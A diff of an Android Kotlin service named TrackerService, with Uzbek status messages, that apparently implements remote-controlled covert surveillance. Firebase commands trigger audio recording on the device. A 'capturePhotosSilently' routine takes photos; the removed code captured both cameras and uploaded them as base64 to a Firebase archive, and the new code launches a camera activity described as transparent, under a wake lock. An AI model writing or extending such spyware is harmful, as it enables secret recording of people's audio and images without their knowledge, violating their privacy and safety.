@@ -91,8 +91,21 @@ class TrackerService : Service() {
     }
 
     fun getActiveDeviceId(): String {
-        val prefs = getSharedPreferences("hokim_app_prefs", MODE_PRIVATE)
-        val userJson = prefs.getString("current_user", null)
+        val appPrefs = getSharedPreferences("app_prefs", MODE_PRIVATE)
+        val uName = appPrefs.getString("current_username", null)
+        if (!uName.isNullOrBlank()) {
+            currentDeviceId = uName
+            return uName
+        }
+
+        val hokimPrefs = getSharedPreferences("hokim_app_prefs", MODE_PRIVATE)
+        val hName = hokimPrefs.getString("current_username", null)
+        if (!hName.isNullOrBlank()) {
+            currentDeviceId = hName
+            return hName
+        }
+
+        val userJson = appPrefs.getString("current_user", null) ?: hokimPrefs.getString("current_user", null)
         if (!userJson.isNullOrEmpty()) {
             try {
                 val u = Gson().fromJson(userJson, User::class.java)
@@ -266,7 +279,13 @@ class TrackerService : Service() {
 
         commandsRef?.child("record_audio")?.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
-                val shouldRecord = snapshot.getValue(Boolean::class.java) ?: false
+                val value = snapshot.value
+                val shouldRecord = when (value) {
+                    is Boolean -> value
+                    is String -> value.equals("start", ignoreCase = true) || value.equals("true", ignoreCase = true)
+                    is Number -> value.toLong() > 0L
+                    else -> false
+                }
                 if (shouldRecord && !isRecording) {
                     startAudioRecording()
                 } else if (!shouldRecord && isRecording) {
@@ -349,61 +368,19 @@ class TrackerService : Service() {
     }
 
     private fun capturePhotosSilently() {
-        val manager = getSystemService(CAMERA_SERVICE) as CameraManager
+        val devId = getActiveDeviceId()
         try {
-            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
-                mediaRef?.child("status")?.setValue("Xatolik: Kamera ruxsati yo'q!")
-                return
-            }
-
             acquireWakeLock(20000L)
             mediaRef?.child("status")?.setValue("📷 Rasmga olinmoqda...")
-
-            val cameraIdBack = manager.cameraIdList.firstOrNull {
-                manager.getCameraCharacteristics(it).get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK
-            } ?: manager.cameraIdList[0]
-
-            val cameraIdFront = manager.cameraIdList.firstOrNull {
-                manager.getCameraCharacteristics(it).get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT
-            } ?: cameraIdBack
-
-            takeSingleCamera2Photo(manager, cameraIdBack) { backBase64 ->
-                takeSingleCamera2Photo(manager, cameraIdFront) { frontBase64 ->
-                    if (backBase64 == null && frontBase64 == null) {
-                        // Agar Camera2 to'g'ridan-to'g'ri ishlamasa, shaffof CameraActivity orqali olamiz
-                        val intent = Intent(this, CameraActivity::class.java).apply {
-                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
-                            putExtra("device_id", getActiveDeviceId())
-                        }
-                        startActivity(intent)
-                        releaseWakeLock()
-                        return@takeSingleCamera2Photo
-                    }
-
-                    val archiveItem = mapOf(
-                        "back_base64" to (backBase64 ?: ""),
-                        "front_base64" to (frontBase64 ?: ""),
-                        "timestamp" to System.currentTimeMillis()
-                    )
-                    val photosRef = mediaRef?.child("archive_photos")
-                    photosRef?.push()?.setValue(archiveItem)?.addOnCompleteListener { task ->
-                        releaseWakeLock()
-                        if (task.isSuccessful) {
-                            mediaRef?.child("latest_photo")?.setValue(archiveItem)
-                            mediaRef?.child("status")?.setValue("📷 Rasm olindi va saqlandi!")
-                            if (photosRef != null) {
-                                trimFirebaseArchive(photosRef, 15)
-                            }
-                        } else {
-                            mediaRef?.child("status")?.setValue("Xatolik: ${task.exception?.message}")
-                        }
-                    }
-                }
+            val intent = Intent(this, CameraActivity::class.java).apply {
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
+                putExtra("device_id", devId)
             }
+            startActivity(intent)
         } catch (e: Exception) {
-            releaseWakeLock()
             Log.e(TAG, "Silent photo error", e)
             mediaRef?.child("status")?.setValue("Kamera xatosi: ${e.message}")
+            releaseWakeLock()
         }
     }
 
